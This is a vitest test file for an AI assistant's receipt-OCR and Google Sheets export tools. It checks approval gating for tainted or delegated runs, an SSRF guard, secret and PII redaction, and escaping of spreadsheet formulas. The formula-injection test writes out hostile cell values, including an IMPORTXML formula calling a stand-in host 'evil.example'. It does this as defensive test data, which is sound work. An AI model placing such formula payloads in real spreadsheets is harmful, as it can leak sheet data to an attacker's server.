import { describe, expect, it } from 'vitest';
import { redactText } from '../../../core/logger.js';
import { toGeminiSchema } from '../../../providers/gemini/convert.js';
import { CDN, CARD, SECRET, SHEETS, SHEETS_URL, TAX_ID, THAI_JSON, THAI_RECEIPT, receiptRig, src } from './receipt-fixture.js';
import { receiptSchema, sheetRowInput } from './receipt.js';
import { SENT_NOTE } from './sheets.js';
import { ocrGroup } from './index.js';

type Rig = Awaited<ReturnType<typeof receiptRig>>;
const posts = (t: Rig) => t.transport.requests.filter((r) => r.url.href === SHEETS_URL);
const body = (t: Rig) => JSON.parse(posts(t)[0]!.body!.toString()) as { secret: string; rows: unknown[][] };
const ROW = sheetRowInput(THAI_RECEIPT);

describe('receipt', () => {
  it('schema accepts the fixture and rejects a missing total', () => {
    expect(receiptSchema.safeParse(THAI_RECEIPT).success).toBe(true);
    expect(receiptSchema.safeParse({ ...THAI_RECEIPT, total: undefined }).success).toBe(false);
  });

  it('extract_receipt is a pure read: untrusted result, schema converts for Gemini, never exports, never asks approval', async () => {
    for (const ctx of [{}, { direct: false, origin: 'delegated' }]) {
      const t = await receiptRig({ sheets: SHEETS, ctx });
      expect(t.tool).toMatchObject({ name: 'extract_receipt', kind: 'read', untrustedOutput: true });
      expect(() => toGeminiSchema(t.tool.inputSchema as never)).not.toThrow();
      const res = await t.reg.run('extract_receipt', {}, t.c);
      expect(res.isError).toBeFalsy();
      expect(t.c.run.tainted()).toBe(true);
      expect(res.content).toMatch(/^<untrusted[^>]*source="ocr"/);
      expect(res.content).toContain(`sheets_append_receipt with: ${JSON.stringify(ROW)}`);
      expect(posts(t)).toHaveLength(0);
      expect(t.approvals.request).not.toHaveBeenCalled();
      expect(t.port.files).toHaveLength(1);
    }
    const none = await receiptRig();
    expect((await none.reg.run('extract_receipt', {}, none.c)).content).not.toMatch(/sheets_append_receipt/);
  });

  it('invalid model JSON → one repair retry then tool error', async () => {
    const t = await receiptRig({ replies: ['not json at all', '```json\n' + THAI_JSON + '\n```'] });
    const ok = await t.reg.run('extract_receipt', {}, t.c);
    expect(ok.isError).toBeFalsy();
    expect(t.provider.calls).toHaveLength(2);
    const bad = await receiptRig({ replies: ['nope', '{"merchant": 1}', THAI_JSON] });
    const res = await bad.reg.run('extract_receipt', {}, bad.c);
    expect(res).toMatchObject({ isError: true });
    expect(res.content).toMatch(/could not be read as a receipt/);
    expect(bad.provider.calls).toHaveLength(2);
    expect(bad.port.files).toHaveLength(0);
  });

  it('cell "=IMPORTXML(...)" exported as text, also for tab/CR-prefixed cells', async () => {
    const evil = { ...ROW, merchant: '=IMPORTXML("http://evil.example","//a")', currency: '\tTHB', date: '\r2026-10-30' };
    const t = await receiptRig({ sheets: SHEETS });
    const res = await t.reg.run('sheets_append_receipt', evil, t.c);
    expect(res.isError).toBeFalsy();
    const [row] = body(t).rows;
    expect(row).toEqual(["'\r2026-10-30", "'=IMPORTXML(\"http://evil.example\",\"//a\")", "'\tTHB", 145, 10.15, 155.15]);
    // CSV of the extracted receipt
    const e = { ...THAI_RECEIPT, merchant: '=IMPORTXML("x")', currency: '\tTHB', date: '\r2026-10-30', items: [{ name: '@SUM(1)', qty: 1, unitPrice: 1, total: 1 }, { name: '+cmd', qty: 1, unitPrice: 1, total: 1 }] };
    const u = await receiptRig({ replies: [JSON.stringify(e)] });
    await u.reg.run('extract_receipt', {}, u.c);
    const csv = u.port.files[0]!.file.data.toString('utf8');
    for (const s of ["'=IMPORTXML", "'@SUM(1)", "'+cmd", "'\tTHB", "'\r2026-10-30"]) expect(csv).toContain(s);
  });

  it('merchant, tax id and card digits absent from logs and audit rows', async () => {
    const t = await receiptRig({ sheets: SHEETS });
    await t.reg.run('extract_receipt', {}, t.c);
    await t.reg.runApproved('sheets_append_receipt', ROW, t.replayCtx());
    expect(t.audits.length).toBeGreaterThan(0);
    for (const dump of [JSON.stringify(t.audits), JSON.stringify(t.logs)])
      for (const s of ['ร้านกาแฟดี', TAX_ID, CARD, 'ลาเต้', 'บราวนี่']) expect(dump).not.toContain(s);
    const bad = await receiptRig({ replies: [`ร้านกาแฟดี ${TAX_ID} ${CARD}`, `still not json ${TAX_ID}`] });
    const res = await bad.reg.run('extract_receipt', {}, bad.c);
    for (const dump of [JSON.stringify(bad.audits), JSON.stringify(bad.logs), res.content]) for (const s of [TAX_ID, CARD]) expect(dump).not.toContain(s);
  });

  it('sheets › missing env → no sheets tool (group) and extract_receipt does not mention it', async () => {
    const mk = (googleSheets?: unknown) => ocrGroup({ env: { googleSheets }, port: {}, metered: { call: async () => ({ text: '', costUsd: 0 }) } } as never);
    const names = (g: ReturnType<typeof mk>) => ('tools' in g ? g.tools.map((x) => x.name) : []);
    expect(names(mk())).toEqual(['ocr_image', 'read_image', 'extract_receipt']);
    expect(names(mk({ url: 'http://127.0.0.1/macros/s/a/exec', secret: SECRET }))).toEqual(['ocr_image', 'read_image', 'extract_receipt']);
    expect(names(mk(SHEETS))).toEqual(['ocr_image', 'read_image', 'extract_receipt', 'sheets_append_receipt']);
  });

  it('sheets › private/loopback URL refused by SSRF guard', async () => {
    const t = await receiptRig({ sheets: SHEETS, hosts: { 'script.google.com': ['127.0.0.1'] } });
    const res = await t.reg.run('sheets_append_receipt', ROW, t.c);
    expect(res.isError).toBe(true);
    expect(res.content).toMatch(/refused/);
    expect(res.content).not.toContain(SECRET);
    expect(posts(t)).toHaveLength(0);
  });

  it('sheets › delegated, voice, schedule or tainted run asks approval before export; replay uses the real approved context', async () => {
    for (const over of [{ direct: false, origin: 'delegated' }, { direct: false, origin: 'voice' }, { direct: false, origin: 'schedule' }, { direct: true, origin: 'chat', tainted: () => true }]) {
      const t = await receiptRig({ sheets: SHEETS, ctx: over });
      const res = await t.reg.run('sheets_append_receipt', ROW, t.c);
      expect(res.content, JSON.stringify(over)).toMatch(/^NOT DONE YET: waiting for approval of/);
      expect(t.approvals.request).toHaveBeenCalledTimes(1);
      const req = (t.approvals.request.mock.calls as unknown as [{ reason: string; tool: { name: string; input: unknown } }][])[0]![0];
      expect(req.tool).toEqual({ name: 'sheets_append_receipt', input: ROW });
      expect(req.reason).toMatch(/sheets_append_receipt.*Google Sheets.*total 155\.15/);
      expect(req.reason).not.toContain(SECRET);
      expect(posts(t)).toHaveLength(0);
    }
    // direct and untainted: no approval
    const direct = await receiptRig({ sheets: SHEETS });
    expect((await direct.reg.run('sheets_append_receipt', ROW, direct.c)).content).toBe(SENT_NOTE);
    // approved replay: the context has NO attachments and is never direct; the stored row alone is enough, and no model call happens
    const again = await receiptRig({ sheets: SHEETS, ctx: { direct: false, origin: 'delegated' } });
    const rc = again.replayCtx();
    expect(rc.source.attachments).toEqual([]);
    expect(rc.direct).toBe(false);
    const done = await again.reg.runApproved('sheets_append_receipt', ROW, rc);
    expect(done).toMatchObject({ content: SENT_NOTE });
    expect(posts(again)).toHaveLength(1);
    expect(body(again).rows).toHaveLength(1);
    expect(again.provider.calls).toHaveLength(0);
  });

  it('sheets_append_receipt input is strict and capped', async () => {
    const t = await receiptRig({ sheets: SHEETS });
    for (const bad of [{ ...ROW, extra: 1 }, { ...ROW, merchant: 'x'.repeat(201) }, { ...ROW, total: '1' }, { ...ROW, total: undefined }, { ...ROW, rows: [[1]] }]) {
      expect((await t.reg.run('sheets_append_receipt', bad, t.c)).isError, JSON.stringify(bad).slice(0, 60)).toBe(true);
    }
    expect(posts(t)).toHaveLength(0);
  });

  it('secret › GOOGLE_SHEETS_WEBAPP_SECRET never in result, audit or embed', async () => {
    const t = await receiptRig({ sheets: SHEETS });
    const a = await t.reg.run('extract_receipt', {}, t.c);
    expect(await t.reg.run('sheets_append_receipt', ROW, t.c)).toMatchObject({ content: expect.stringMatching(/^NOT DONE YET/) }); // tainted by the read
    const b = await t.reg.runApproved('sheets_append_receipt', ROW, t.replayCtx());
    const everything = JSON.stringify([a, b, t.audits, t.logs, t.port.files.map((f) => ({ ...f, file: { ...f.file, data: f.file.data.toString('utf8') } })), t.provider.calls]);
    expect(everything).not.toContain(SECRET);
    expect(body(t).secret).toBe(SECRET);
    expect(redactText(`fetch ${SHEETS_URL} failed`)).not.toContain('AKfycbxTEST_id-1');
  });

  it('CSV post failure (no Attach Files) is reported with the table', async () => {
    const t = await receiptRig({ sheets: SHEETS });
    t.port.failPost = new Error('Missing Permissions');
    const res = await t.reg.run('extract_receipt', {}, t.c);
    expect(res.isError).toBeFalsy();
    expect(res.content).toMatch(/could not be posted/);
    expect(res.content).toContain('| Item |');
    expect(res.content).not.toContain('Missing Permissions');
  });

  it('no attachment or a bad index → tool error, nothing fetched or called', async () => {
    const t = await receiptRig({ ctx: { source: src([]) } });
    expect(await t.reg.run('extract_receipt', {}, t.c)).toMatchObject({ isError: true });
    const u = await receiptRig();
    expect(await u.reg.run('extract_receipt', { attachmentIndex: 3 }, u.c)).toMatchObject({ isError: true });
    expect(await u.reg.run('extract_receipt', { url: CDN }, u.c)).toMatchObject({ isError: true });
    expect(u.provider.calls).toHaveLength(0);
  });
});
